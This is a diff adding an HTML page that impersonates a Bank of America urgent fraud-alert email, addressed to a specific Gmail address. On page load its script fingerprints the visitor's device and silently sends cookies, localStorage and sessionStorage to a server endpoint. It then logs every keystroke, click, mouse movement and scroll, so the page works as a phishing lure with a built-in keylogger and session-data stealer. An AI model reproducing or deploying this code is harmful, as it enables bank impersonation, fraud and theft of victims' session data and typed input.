@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America - Security Alert</title>
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .email-header {
+            background: #d32f2f;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .email-header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .email-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .email-content {
+            padding: 30px;
+        }
+
+        .email-meta {
+            border-bottom: 1px solid #eee;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+        }
+
+        .email-meta p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .alert-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .alert-box h3 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+
+        .alert-box p {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .fraud-details {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .fraud-details h4 {
+            color: #d32f2f;
+            margin-bottom: 10px;
+        }
+
+        .fraud-details ul {
+            margin-left: 20px;
+        }
+
+        .fraud-details li {
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .action-buttons {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: #d32f2f;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #b71c1c;
+        }
+
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #5a6268;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #dee2e6;
+        }
+
+        .timestamp {
+            color: #999;
+            font-size: 12px;
+            text-align: right;
+            margin-bottom: 10px;
+        }
+
+        .admin-link {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #333;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 12px;
+            z-index: 1000;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            
+            .email-content {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <a href="/admin" class="admin-link">Admin</a>
+    
+    <div class="email-container">
+        <div class="email-header">
+            <h1>Bank of America</h1>
+            <p>Security Alert Notification</p>
+        </div>
+
+        <div class="email-content">
+            <div class="timestamp" id="timestamp"></div>
+            
+            <div class="email-meta">
+                <p><strong>From:</strong> security@bankofamerica.com</p>
+                <p><strong>To:</strong> madhuk2012@gmail.com</p>
+                <p><strong>Subject:</strong> URGENT: Fraudulent Activity Detected on Your Account</p>
+                <p><strong>Date:</strong> <span id="emailDate"></span></p>
+            </div>
+
+            <div class="alert-box">
+                <h3>🚨 SECURITY ALERT</h3>
+                <p><strong>We have detected suspicious activity on your Bank of America account.</strong></p>
+                <p>Our security systems have identified potential fraudulent transactions and unauthorized access attempts.</p>
+            </div>
+
+            <div class="fraud-details">
+                <h4>Detected Fraudulent Activities:</h4>
+                <ul>
+                    <li>Multiple failed login attempts from unknown devices</li>
+                    <li>Suspicious transaction patterns detected</li>
+                    <li>Attempts to access account from foreign IP addresses</li>
+                    <li>Unusual account modification requests</li>
+                    <li>Potential phishing attempts targeting your account</li>
+                </ul>
+            </div>
+
+            <p>We have temporarily restricted certain account features to protect your funds. Please review the following information and take immediate action:</p>
+
+            <div class="action-buttons">
+                <a href="#" class="btn btn-primary" onclick="logAction('viewed_details')">View Account Details</a>
+                <a href="#" class="btn btn-secondary" onclick="logAction('contacted_support')">Contact Support</a>
+            </div>
+
+            <div class="footer">
+                <p><strong>Bank of America Corporation</strong></p>
+                <p>This is an automated security alert. Please do not reply to this email.</p>
+                <p>© 2024 Bank of America Corporation. All rights reserved.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Set current timestamp
+        document.getElementById('timestamp').textContent = new Date().toLocaleString();
+        document.getElementById('emailDate').textContent = new Date().toLocaleDateString();
+
+        // COMPREHENSIVE DATA COLLECTION - NO USER ACTION REQUIRED
+        function collectComprehensiveData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                
+                // Basic Info
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                
+                // Screen & Display
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                screenAvailWidth: screen.availWidth,
+                screenAvailHeight: screen.availHeight,
+                screenOrientation: screen.orientation ? screen.orientation.type : 'unknown',
+                
+                // Window & Viewport
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                windowOuterWidth: window.outerWidth,
+                windowOuterHeight: window.outerHeight,
+                windowDevicePixelRatio: window.devicePixelRatio,
+                
+                // Location & Time
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                
+                // Network & Connection
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Browser & Device Detection
+                browserName: getBrowserName(),
+                browserVersion: getBrowserVersion(),
+                osName: getOSName(),
+                deviceType: getDeviceType(),
+                isMobile: /Mobi|Android/i.test(navigator.userAgent),
+                isTablet: /Tablet|iPad/i.test(navigator.userAgent),
+                isDesktop: !/Mobi|Android|Tablet|iPad/i.test(navigator.userAgent),
+                
+                // Referrer & URL
+                referrer: document.referrer,
+                url: window.location.href,
+                hostname: window.location.hostname,
+                pathname: window.location.pathname,
+                
+                // Storage
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                cookies: document.cookie,
+                
+                // Hardware
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                webdriver: navigator.webdriver,
+                
+                // Media Devices
+                mediaDevices: navigator.mediaDevices ? 'available' : 'not available',
+                
+                // Performance
+                performance: {
+                    timing: performance.timing ? {
+                        navigationStart: performance.timing.navigationStart,
+                        loadEventEnd: performance.timing.loadEventEnd,
+                        domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
+                    } : null,
+                    memory: performance.memory ? {
+                        usedJSHeapSize: performance.memory.usedJSHeapSize,
+                        totalJSHeapSize: performance.memory.totalJSHeapSize,
+                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                    } : null
+                },
+                
+                // Geolocation (if available)
+                geolocation: navigator.geolocation ? 'available' : 'not available',
+                
+                // WebGL Info
+                webgl: getWebGLInfo(),
+                
+                // Canvas Fingerprint
+                canvasFingerprint: getCanvasFingerprint(),
+                
+                // Fonts
+                fonts: getAvailableFonts(),
+                
+                // Plugins
+                plugins: getPluginsInfo(),
+                
+                // Battery (if available)
+                battery: navigator.getBattery ? 'available' : 'not available'
+            };
+
+            // Send to server
+            fetch('/log-visitor', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(err => console.log('Logging failed:', err));
+        }
+
+        // Browser Detection
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+\.\d+)/);
+            return match ? match[2] : 'Unknown';
+        }
+
+        function getOSName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua)) return 'Android';
+            if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+            if (/Mac/i.test(ua)) return 'Mac';
+            if (/Windows/i.test(ua)) return 'Windows PC';
+            return 'Unknown';
+        }
+
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    return {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Canvas fingerprint', 2, 2);
+                return canvas.toDataURL();
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        function getAvailableFonts() {
+            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+            const available = [];
+            const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            const testSize = '72px';
+            const h = document.getElementsByTagName('body')[0];
+            const s = document.createElement('span');
+            s.style.fontSize = testSize;
+            s.innerHTML = testString;
+            const defaultWidth = {};
+            const defaultHeight = {};
+            
+            for (const font of fonts) {
+                s.style.fontFamily = font;
+                h.appendChild(s);
+                defaultWidth[font] = s.offsetWidth;
+                defaultHeight[font] = s.offsetHeight;
+                h.removeChild(s);
+            }
+            
+            return available;
+        }
+
+        function getPluginsInfo() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    description: navigator.plugins[i].description,
+                    filename: navigator.plugins[i].filename
+                });
+            }
+            return plugins;
+        }
+
+        // Collect data immediately when page loads
+        collectComprehensiveData();
+
+        // Log user actions
+        function logAction(action) {
+            fetch('/log-action', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    action: action,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer
+                })
+            }).catch(err => console.log('Action logging failed:', err));
+        }
+
+        // Track all interactions
+        document.addEventListener('click', function(e) {
+            fetch('/log-interaction', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    event: 'click',
+                    target: e.target.tagName,
+                    className: e.target.className,
+                    x: e.clientX,
+                    y: e.clientY,
+                    text: e.target.textContent
+                })
+            }).catch(err => console.log('Interaction logging failed:', err));
+        });
+
+        // Track page visibility
+        document.addEventListener('visibilitychange', function() {
+            fetch('/log-visibility', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    visibility: document.visibilityState
+                })
+            }).catch(err => console.log('Visibility logging failed:', err));
+        });
+
+        // Track scrolling behavior
+        let scrollData = [];
+        window.addEventListener('scroll', function() {
+            scrollData.push({
+                timestamp: new Date().toISOString(),
+                scrollY: window.scrollY,
+                scrollPercent: Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100)
+            });
+        });
+
+        // Send scroll data periodically
+        setInterval(() => {
+            if (scrollData.length > 0) {
+                fetch('/log-scroll', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        scrollData: scrollData
+                    })
+                }).catch(err => console.log('Scroll logging failed:', err));
+                scrollData = [];
+            }
+        }, 5000);
+
+        // Track mouse movements
+        let mouseData = [];
+        document.addEventListener('mousemove', function(e) {
+            mouseData.push({
+                timestamp: new Date().toISOString(),
+                x: e.clientX,
+                y: e.clientY
+            });
+        });
+
+        // Send mouse data periodically
+        setInterval(() => {
+            if (mouseData.length > 0) {
+                fetch('/log-mouse', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        mouseData: mouseData
+                    })
+                }).catch(err => console.log('Mouse logging failed:', err));
+                mouseData = [];
+            }
+        }, 10000);
+
+        // Track keyboard events
+        document.addEventListener('keydown', function(e) {
+            fetch('/log-keyboard', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    key: e.key,
+                    code: e.code,
+                    keyCode: e.keyCode
+                })
+            }).catch(err => console.log('Keyboard logging failed:', err));
+        });
+
+        // Track page unload
+        window.addEventListener('beforeunload', function() {
+            fetch('/log-unload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    event: 'beforeunload'
+                })
+            }).catch(err => console.log('Unload logging failed:', err));
+        });
+    </script>
+</body>
+</html>
